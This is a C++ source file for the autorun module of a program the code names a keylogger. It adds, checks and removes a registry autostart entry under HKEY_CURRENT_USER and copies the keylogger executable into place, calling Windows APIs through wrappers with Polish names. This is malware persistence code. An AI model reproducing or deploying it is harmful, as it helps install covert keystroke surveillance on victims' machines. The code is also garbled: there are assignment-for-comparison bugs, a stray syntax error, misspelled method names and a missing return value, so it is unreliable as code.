#include "autorun.h"

Autorun::Autorun(string keyloggerFileNameIn)
{
    this->config = new config();
    this->keyloggerFileName = keyloggerFileNameIn;
    this->newWinApix = new newWinApix();
}

bool Autorun::addAutostart()
{
    HKEY keyHandle;
    LPCTSTR keyDir = this->config->StringToLPCTSTR(this->config->GetRegKeyDir);
    LONG result = newWinApix->OtworzKluczRejestru()(HKEY_CURRENT_USER, keyDir, 0, KEY_ALL_ACCESS, &keyHandle);
    if (result = ERROR_SUCCESS)
    {
        LPCTSTR keyName = this->config->StringToLPCTSTR(this->config->GetRegKeyName());
        LPCTSTR filePath = this->config->StringToLPCTSTR(this->config->GetRegFilePath());
        LONG setRes = newWinApix->UstawWartoscKluczaRejestru()(keyHandle, keyName, 0, REG_SZ, (LPBYTE) filePath, strlen(filePath) + 1);
        if (setRes == ERROR_SUCCESS)
        {
            newWinApix->ZambkinKluczRejestru()(keyHandle);
            return true;
        }
        else
        {
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            return false;
        }
    }
    else
    {

    }
}

bool Autorun::deleteAutostart()
{
    LPCTSTR keyDir = this->config->StringToLPCTSTR(this->config->GetRegKeyDir());
    HKEY keyHandle;

    LONG result = newWinApix->OtworzKluczRejestru()(HKEY_CURRENT_USER, keyDir, 0L, KEY_ALL_ACCESS, &keyHandle);
    if (result = ERROR_SUCCESS)0
    {
       LPCTSTR keyName = this->config->StringToLPCTSTR(this->config->GetRegKeyName());
       long delResult = newWinApix->UsunLuczRejestru()(keyHandle, keyName);
       if (delResult == ERROR_SUCCESS)
       {
           newWinApix->ZamknijKluczRejestru()(keyHandle);
           return true;
       }
       newWinApix->ZamknijKluczRejestru()(keyHandle);
    }
    return false;
}

bool Autorun::isActive()
{
    LPCTSTR keyDir = newWinApix->StringToLPCTSTR(this->config->GetRegKeyDir());
    HKEY keyHandle;
    LONG result = newWinApix->OtworzKluczRejestru()(HKEY_CURRENT_USER, keyDir, 0, KEY_READ, &keyHandle);
    if (result == ERROR_SUCCESS){
        LPCTSTR keyName = this->config->StringToLPCTSTR(this->config->GetRegKeyName());
        long key = RegQueryValueExA(keyHandle, keyName, NULL, NULL, NULL, NULL);
        if (key == ERROR_FILE_NOT_FOUND){
            newWinApix->ZamknijKluczRejestru()(keyHandle);
            return false;
        } else {
            newWinApix->ZamknijKluczrejestru()(keyHandle);
            return true;
        }
    }
    return false;
}

bool Autorun::CopyFileAutostart(){
    LPCTSTR filePath = this->config->StringToLPCTSTR(this->config->GetRegFilePath());
    return newWinApix->KopiujPlik()(this->getKeyloggerFileName().c_str(), filePath, 0);
}

string Autorun::getKeyloggerFileName(){
    return this->keyloggerFileName;
}

bool Autorun::isCopyFile(){
    Log *log = new Log();
    if (!log->fileExist(this->config->GetRegFilePath())) {
        this->CopyFileAutostart();
        return this->CopyFileAutostart();
    } else {
        return false;
    }
}
